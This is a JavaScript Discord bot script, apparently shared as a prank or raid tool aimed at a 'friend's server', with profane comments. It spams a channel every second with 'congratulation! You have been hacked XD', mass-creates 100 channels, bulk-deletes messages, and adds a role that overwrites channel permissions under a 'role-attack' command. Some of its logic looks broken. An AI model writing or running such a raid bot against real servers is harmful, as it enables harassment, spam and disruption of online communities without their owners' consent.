const discord = require("discord.js")
// discord.js
const client = new discord.Client()
// client for your fucking bot! xD
const prefix = '%'
// prefix for fucking commands

client.on('ready', () => {
    console.log('ready')
    // when your bot is ready :)
    client.user.setAvatar('you can set whatever you want')
    // XD
    setInterval(() => {
        const channel = client.channels.cache.get(CHANNEL_ID);
        if (channel) {
            //Have Fun :D
          channel.send('congratulation! You have been hacked XD');
        } else {
            // fucking error :(
          console.error(`Channel with ID ${CHANNEL_ID} not found!`);
        }
      }, 1000);
})

client.on('message', async (message) => {
    if (message.content === `${prefix}channel-create`) {
        // Your firends server XD
      const guild = client.guilds.cache.get('GUILD_ID');
      try {
        // channels count
        for (let i = 1; i <= 100; i++) {
          await guild.channels.create(`channel-${i}`, { type: 'text' });
        }
        // announce
        console.log('Created 100 channels!');
        setTimeout(async () => {
          const channels = guild.channels.cache.filter((channel) =>
            channel.name.startsWith('channel-')
          );
          const deleted = await Promise.all(
            channels.map((channel) => channel.bulkDelete(100))
          );
          console.log(`Deleted ${deleted.flat().length} messages!`);
        }, 60000);
      } catch (error) {
        console.error(error);
      }
    }
    // member kicking roles
    if (message.content === `${prefix}role-attack`) {
      // your firends server id
      const guild = client.guilds.cache.get('GUILD_ID');
      try {
        const role = await guild.roles.create({
          data: {
            name: 'Restricted',
            color: 'GREY',
            permissions: ['VIEW_CHANNEL'],
          },
          reason: 'Restricting access to channels',
        });
        const channels = guild.channels.cache.filter(
          (channel) => channel.type === 'text'
        );
        channels.forEach(async (channel) => {
          await channel.overwritePermissions([
            {
              id: role.id,
              deny: ['VIEW_CHANNEL'],
            },
          ]);
        });
        console.log('Restricted access to channels!');
        setTimeout(async () => {
          await role.delete();
          console.log('Removed restricted role!');
        }, 60000);
      } catch (error) {
        console.error(error);
      }
    }
  });

client.login('your token')